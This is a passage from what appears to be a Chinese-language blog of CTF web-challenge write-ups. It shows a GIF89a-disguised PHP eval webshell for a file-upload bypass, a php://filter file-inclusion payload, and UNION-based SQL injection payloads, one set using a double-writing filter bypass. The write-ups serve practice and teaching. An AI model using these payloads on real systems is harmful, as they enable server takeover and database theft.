<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸä¸Šä¼ </p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/success4.png" class="" title="ä¸Šä¼ æˆåŠŸ">

<p>ä½†æ˜¯ä¸çŸ¥é“ä¸Šä¼ è·¯å¾„ï¼ŒçŒœæµ‹æ˜¯åœ¨&#x2F;uploadä¸‹ï¼Œåˆ©ç”¨èšå‰‘æˆåŠŸè¿æ¥ï¼Œè·å–flag.</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hcflyy/p/3568839.html">GIF89aå›¾ç‰‡å¤´æ–‡ä»¶æ¬ºéª—</a><br><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197631">PHP Webshellæ£€æµ‹ä¸ç»•è¿‡</a></p>
</blockquote>
<h1 id="T6-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#T6-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="T6 [æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>T6 [æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Secret%20File">é¢˜ç›®åœ°å€</a></p>
<p>æŸ¥çœ‹æºç ï¼Œå‘ç°<code>href=&quot;./Archive_room.php&quot;</code>ï¼Œè¿›å…¥ç‚¹å‡»SECRETï¼Œæç¤ºæˆ‘ä»¬â€œæŸ¥é˜…ç»“æŸâ€ï¼Œç›´æ¥æŠ“åŒ…æŸ¥çœ‹</p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/bp.png" class="" title="æŠ“åŒ…">

<p>è¿›å…¥å®¡è®¡é¡µé¢ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&#x27;file&#x27;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="è§£é¢˜æ€è·¯-3"><a href="#è§£é¢˜æ€è·¯-3" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>å¯ä»¥çœ‹åˆ°å¯¹ä¼ å…¥çš„fileè¿›è¡Œäº†ä¸€å®šçš„è¿‡æ»¤ã€‚å…¶ä¸­ï¼Œ<code>strstr()</code>æœ‰å¦‚ä¸‹ä½œç”¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ˜¯ï¼Œè¿”å›è¯¥å­—ç¬¦ä¸²åŠå‰©ä½™éƒ¨åˆ†ï¼Œå¦åˆ™è¿”å› FALSEï¼ˆstristrä¸ºä¸åŒºåˆ†å¤§å°å†™æœç´¢ï¼‰</span><br></pre></td></tr></table></figure>

<p>å…ˆå°è¯•ç›´æ¥ä¼ å…¥<code>file=flag.php</code>ï¼Œå‘Šè¯‰æˆ‘ä»¬å¯¹flagä¸å¯è§ã€‚</p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/fail.png" class="" title="fail">

<p>è€ƒè™‘æ–‡ä»¶åŒ…å«æ¼æ´</p>
<blockquote>
<p>å¸¸è§çš„æ–‡ä»¶åŒ…å«å‡½æ•°æœ‰<code>include(), require(), include_once(), require_once()</code>ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ä¸Šè¿°çš„å››ä¸ªå‡½æ•°è¿›è¡Œæ–‡ä»¶åŒ…å«çš„æ—¶å€™ï¼Œå¦‚æœè¢«åŒ…å«çš„æ–‡ä»¶ç¬¦åˆPHPè¯­æ³•è§„èŒƒï¼Œé‚£ä¹ˆä»»ä½•æ‹“å±•åéƒ½ä¼šè¢«PHPè§£æã€‚å¦‚æœåŒ…å«çš„æ˜¯éPHPè§„èŒƒçš„æºä»£ç æˆ–æ–‡ä»¶ï¼Œåˆ™ä¼šæš´éœ²å…¶æºä»£ç æˆ–è€…æ–‡ä»¶å†…å®¹ã€‚å¯¹äºç¬¦åˆPHPè§„èŒƒçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬åœ¨åˆ©ç”¨æ—¶ï¼Œå¯ä»¥é€šè¿‡file:&#x2F;&#x2F;æˆ–è€…php:&#x2F;&#x2F;è¿™æ ·çš„ä¼ªåè®®æ¥è¯»å–æºä»£ç ã€‚</p>
</blockquote>
<p>åˆ©ç”¨PHP filterä¼ªåè®®æ„é€ Payload</p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/wxy.png" class="" title="ä¼ªåè®®">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>æœ€åå¯¹è¯»å–çš„æºä»£ç è¿›è¡Œbase64è§£ç å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7NjBkMWFmYmEtZDNlZi00OTc2LThmNDAtNDM0NDZlYWU3ZjAyfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;å•Šå“ˆï¼ä½ æ‰¾åˆ°æˆ‘äº†ï¼å¯æ˜¯ä½ çœ‹ä¸åˆ°æˆ‘QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;æˆ‘å°±åœ¨è¿™é‡Œ&quot;;</span><br><span class="line">                $flag = &#x27;flag&#123;60d1afba-d3ef-4976-8f40-43446eae7f02&#125;&#x27;;</span><br><span class="line">                $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44508748/article/details/108162951#:~:text=PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%8C%87%E7%9A%84%E6%98%AFPHP%E6%89%80%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%EF%BC%8C%E5%9C%A8web%E6%B8%97%E9%80%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E5%B8%B8%E7%94%A8%E4%BA%8E%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E8%A1%8Cweb%E6%94%BB%E5%87%BB%EF%BC%8C%E4%BB%8E%E8%80%8C%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E3%80%82%201.php.ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8F%82%E6%95%B0%EF%BC%9A%20allow_url_fopen,%EF%BC%9Aon%20%23%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AF%20%EF%BC%8C%E8%A1%A8%E7%A4%BA%E5%85%81%E8%AE%B8url%E9%87%8C%E7%9A%84%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%EF%BC%9B">æ¼æ´æ¢³ç†ç¯‡ä¹‹phpä¼ªåè®®</a></p>
</blockquote>
<h1 id="T7-æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#T7-æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="T7 [æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>T7 [æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]LoveSQL">é¢˜ç›®åœ°å€</a></p>
<p>ä¸€é“å¾ˆå¸¸è§„çš„SQLæ³¨å…¥é¢˜ï¼Œç”¨ä¸‡èƒ½å¯†ç <code>1&#39; or 1=1#</code>ç™»å½•ï¼Œæœªæ‰¾åˆ°ä»€ä¹ˆå¯ç”¨ä¿¡æ¯ï¼Œä¸€æ­¥ä¸€æ­¥çˆ†ä¿¡æ¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 4#</span><br></pre></td></tr></table></figure>
<p>çˆ†å­—æ®µæ•°ï¼Œå¾—çŸ¥å­—æ®µæ•°ä¸º 3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,3#</span><br></pre></td></tr></table></figure>
<p>è”åˆæŸ¥è¯¢ï¼Œæµ‹è¯•æ³¨å…¥ç‚¹ï¼ˆå›æ˜¾ç‚¹ä½ï¼‰</p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/test7.png" class="" title="æµ‹è¯•æ³¨å…¥ç‚¹">


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,(group_concat(table_name))from(information_schema.tables)where(table_schema=database())#</span><br></pre></td></tr></table></figure>
<p>çˆ†è¡¨åï¼Œå¾—åˆ°<code>geekuser,l0ve1ysq1</code>ä¸¤ä¸ªè¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;l0ve1ysq1&#x27;)#</span><br></pre></td></tr></table></figure>
<p>çˆ†å­—æ®µåï¼Œå¾—åˆ°<code>id,username,password</code>ä¸‰ä¸ªå­—æ®µ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,group_concat(id,username,password) from l0ve1ysq1#</span><br></pre></td></tr></table></figure>
<p>çˆ†æ•°æ®ï¼ŒæˆåŠŸæ‹¿åˆ°flag.</p>
<blockquote>
<p><a href="https://ex1le23.github.io/2022/12/15/SQL%E6%B3%A8%E5%85%A5/">SQLæ³¨å…¥åŸºç¡€</a></p>
</blockquote>
<h1 id="T8-æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#T8-æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="T8 [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>T8 [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]BabySQL">é¢˜ç›®åœ°å€</a></p>
<p>å°è¯•ä¸‡èƒ½å¯†ç <code>1&#39; or 1=1#</code>ç™»å½•æ— æœï¼Œåº”è¯¥æ˜¯å¯¹ä¸€äº›å­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¯ä»¥ç”¨FUZZæµ‹è¯•ã€‚è¿™é‡Œç›´æ¥æ‰‹æµ‹ä¸€ä¸‹ï¼Œç”¨<code>1&#39; order by 3#</code>è¯•ä¸€è¯•</p>
<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/test8.png" class="" title="æµ‹è¯•">

<p>ç»“æœåªå‰©ä¸‹<code>der 3#</code>äº†ï¼Œè¿‡æ»¤æ‰äº†<code>or</code>å’Œ<code>by</code>ï¼ˆåº”è¯¥æ˜¯ç”¨replaceæ›¿æ¢æ‰äº†ï¼‰ï¼Œç»§ç»­æµ‹è¯•ï¼Œå‘ç°<code>union</code>å’Œ<code>select</code>ä¹Ÿè¢«è¿‡æ»¤ã€‚è¿™é‡Œç”¨<strong>åŒå†™ç»•è¿‡</strong>ï¼š</p>
<p>çˆ†å­—æ®µæ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; oorrder bbyy 4#                  //æµ‹è¯•ä¸º4æ—¶æŠ¥é”™ï¼Œæ•…å­—æ®µæ•°ä¸º3</span><br></pre></td></tr></table></figure>

<p>çˆ†å›æ˜¾ä½</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; uunionnion sselectelect 1,2,3#   //2, 3ä¸ºå›æ˜¾ä½</span><br></pre></td></tr></table></figure>

<p>çˆ†è¡¨å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; uunionnion sselectelect 1,2,(group_concat(table_name))ffromrom(infoorrmation_schema.tables)wwherehere(table_schema=database())#</span><br></pre></td></tr></table></figure>
<p><code>from, where</code>åŒæ ·ç”¨åŒå†™ç»•è¿‡ã€‚å¦å¤–æ³¨æ„<code>inforrmation</code>å«æœ‰<code>or</code>ï¼Œä¹Ÿéœ€è¦ä½œç»•è¿‡å¤„ç†ã€‚æœ€ç»ˆå¾—åˆ°<code>b4bsql,geekuser</code>ä¸¤ä¸ªè¡¨ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; uunionnion sselectelect 1,2,(group_concat(column_name))ffromrom(infoorrmation_schema.columns)wwherehere(table_name=&#x27;b4bsql&#x27;)#</span><br></pre></td></tr></table></figure>
<p>çˆ†å­—æ®µåï¼Œå¾—åˆ°<code>id,username,password</code>ä¸‰ä¸ªå­—æ®µ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; uunionnion sselectelect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql#</span><br></pre></td></tr></table></figure>
<p>çˆ†æ•°æ®ï¼Œæ³¨æ„æˆåŠŸpasswordä¸­çš„<code>or</code>ç»•è¿‡ï¼ŒæˆåŠŸæ‹¿åˆ°flag.</p>

        </div>

        
            <section class="post-copyright">
                
                
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/CTF/"># CTF</a>
                    
                        <a href="/tags/web/"># web</a>
                    
                        
                </span>
            </div>
            <div class="reward" >
                
                    

                
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>Â· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
            
            <a class="next" rel="next" href="/2022/12/27/2022Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-web-%E9%83%A8%E5%88%86/">2022Dest0g3-520è¿æ–°èµ›-web(éƒ¨åˆ†)</a>
            
        </section>

        

    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>Â© Ex1Le23 | Always Hold the Belief.</span>
    </div>
</footer>

    </div>
    <div id="u-search">
        <div class="modal">
            <div class="modal-header">
                <div class="container">
                    <form id="u-search-modal-form" class="u-search-modal-form">
                        <button type="submit" class="form-submit-btn">
                            <img src="/image/search.png" class="search-btn-img" />
                        </button>
                        <input placeholder="æœç´¢æ–‡ç« ã€‚ã€‚ã€‚" class="form-input" onchange="inputChange(event)" id="modal-form-input">
                    </form>
                    <a class="modal-close">x</a>
                </div>
                <div class="search-loading">
                    <div class="search-loading-bar"></div>
                </div>
            </div>
            <div class="modal-body">
                <!-- <ul class="modal-results">
                    <li class="result-item">
                        <a class="result-item-detail">
                            <span class="title">é¡µé¢é…ç½®</span>
                            <span class="content">
                                ç½‘å€ï¼Œä¾‹å¦‚ï¼š front-matter---layout: postdate: <b mark></b>
                                7-07-05title: [è½¬]å¦‚ä½•æ­å»ºåŸºäºHexoçš„ç‹¬ç«‹åšå®¢categories: [Dev, Hexo]tags: - Hexoauthor: name: xaoxuu avatar: https://cdn.jsdelivr.......
                            </span>
                        </a>
                    </li>
                </ul> -->
            </div>
        </div>
        <div class="modal-overlay"></div>
    </div>
</body>
</html>
